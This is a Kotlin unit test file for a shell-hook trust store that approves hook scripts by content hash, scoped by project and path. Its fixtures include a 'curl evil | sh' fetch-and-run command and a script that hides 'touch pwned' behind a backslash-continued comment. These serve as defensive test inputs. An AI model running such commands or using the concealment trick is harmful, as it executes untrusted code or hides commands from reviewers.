package org.appdevforall.shellhooks.engine

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.File

class TrustStoreTest {
    private val store = MapStore()
    private val trust = TrustStore(store)
    private val project = File("/projects/app")
    private val sha = TrustStore.sha256("echo ok\n".toByteArray())

    @Test
    fun nothingIsTrustedUntilApproved() {
        assertFalse(trust.isTrusted(project, "file-saved", sha))
    }

    @Test
    fun approvalCoversThatPathWithThatContent() {
        trust.put(project, "file-saved", sha)

        assertTrue(trust.isTrusted(project, "file-saved", sha))
    }

    @Test
    fun changedContentIsUntrustedAgain() {
        trust.put(project, "file-saved", sha)

        assertFalse(trust.isTrusted(project, "file-saved", TrustStore.sha256("curl evil | sh\n".toByteArray())))
    }

    @Test
    fun approvalDoesNotCarryToAnotherPathOrProject() {
        trust.put(project, "file-saved", sha)

        assertFalse(trust.isTrusted(project, "file-saved.d/other", sha))
        assertFalse(trust.isTrusted(File("/projects/other"), "file-saved", sha))
    }

    @Test
    fun reapprovingReplacesTheOldContent() {
        val newSha = TrustStore.sha256("echo new\n".toByteArray())
        trust.put(project, "file-saved", sha)
        trust.put(project, "file-saved", newSha)

        assertTrue(trust.isTrusted(project, "file-saved", newSha))
        assertFalse(trust.isTrusted(project, "file-saved", sha))
    }

    @Test
    fun revokeForgetsEveryApprovalForTheProject() {
        val other = File("/projects/other")
        trust.put(project, "file-saved", sha)
        trust.put(project, "build-failed", sha)
        trust.put(other, "file-saved", sha)

        trust.revoke(project)

        assertFalse(trust.isTrusted(project, "file-saved", sha))
        assertFalse(trust.isTrusted(project, "build-failed", sha))
        assertTrue(trust.isTrusted(other, "file-saved", sha))
        assertEquals(listOf(TrustStore.canonical(other)), trust.trustedProjects())
    }

    @Test
    fun pathsWithTabsAndNewlinesRoundTrip() {
        val odd = "file-saved.d/a\tb\nc"
        trust.put(project, odd, sha)
        trust.put(project, "file-saved", sha)

        assertTrue(trust.isTrusted(project, odd, sha))
        assertEquals(2, trust.trustedCount(project))
    }

    @Test
    fun approvalSurvivesANewStoreOverTheSameData() {
        trust.put(project, "file-saved", sha)

        assertTrue(TrustStore(store).isTrusted(project, "file-saved", sha))
    }

    @Test
    fun trustingReviewableBytesRecordsTheirHash() {
        val bytes = "#!/bin/sh\necho ok\n".toByteArray()

        assertTrue(trust.trust(project, "file-saved", bytes))
        assertTrue(trust.isTrusted(project, "file-saved", TrustStore.sha256(bytes)))
    }

    @Test
    fun bytesThatCannotBeReviewedAreRefusedAndNothingIsStored() {
        val bytes = ": kept for reference: \\\r\ntouch pwned\n".toByteArray()

        assertFalse(trust.trust(project, "file-saved", bytes))
        assertFalse(trust.isTrusted(project, "file-saved", TrustStore.sha256(bytes)))
        assertTrue(store.map.isEmpty())
    }

    @Test
    fun bytesOverTheSizeLimitAreRefused() {
        val line = "#" + "x".repeat(62) + "\n"
        val bytes = (line.repeat(ScriptReview.MAX_BYTES / line.length) + "#").toByteArray()

        assertFalse(trust.trust(project, "file-saved", bytes))
        assertTrue(store.map.isEmpty())
    }

    @Test
    fun aNameThatCannotBeReviewedIsRefused() {
        val bytes = "#!/bin/sh\necho ok\n".toByteArray()

        assertFalse(trust.trust(project, "file saved", bytes))
        assertTrue(store.map.isEmpty())
    }

    @Test
    fun sha256IsLowercaseHex() {
        assertEquals("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", TrustStore.sha256(ByteArray(0)))
    }
}
